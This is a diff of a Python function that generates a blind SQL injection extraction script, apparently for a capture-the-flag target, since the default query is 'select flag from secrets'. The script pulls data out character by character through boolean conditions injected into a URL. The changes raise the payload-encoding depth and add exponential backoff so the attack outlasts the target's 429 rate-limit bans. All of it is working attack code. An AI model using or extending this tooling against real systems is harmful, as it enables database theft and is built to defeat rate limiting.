@@ -193,7 +193,7 @@ def _blind_extract_script(params: dict) -> str:
 OR,TM = P["oracle_url"], P["true_marker"]
 SUB = P.get("subquery","(select flag from secrets)")
 MAXLEN,DELAY = int(P.get("max_len",64)), float(P.get("delay",0.4))
-DEPTH0,MAXDEPTH = int(P.get("encode_depth",1)), int(P.get("max_encode_depth",3))
+DEPTH0,MAXDEPTH = int(P.get("encode_depth",1)), int(P.get("max_encode_depth",4))
 CHARF="ascii(substr(%s,%d,1))%s%d"
 LENF="length(%s)%s%d"
 depth=[DEPTH0]; reqs=[0]
@@ -205,13 +205,13 @@ def enc(s,n):
 def ask(expr):
     reqs[0]+=1
     url=OR.replace("{cond}", enc(expr, depth[0]))
-    for a in range(8):
-        try:
+    for a in range(12):                         # ride out an escalating ban (up to ~64s) rather
+        try:                                    # than misreading a 429 as a FALSE condition
             b=urllib.request.urlopen(url,timeout=15).read().decode("utf-8","replace")
             time.sleep(DELAY); return TM in b
         except urllib.error.HTTPError as e:
             if e.code==429:
-                time.sleep(2*(a+1)); continue
+                time.sleep(min(2**(a+2),60)); continue   # 4,8,16,32,60,... covers the max ban
             body=""
             try: body=e.read().decode("utf-8","replace")
             except Exception: pass
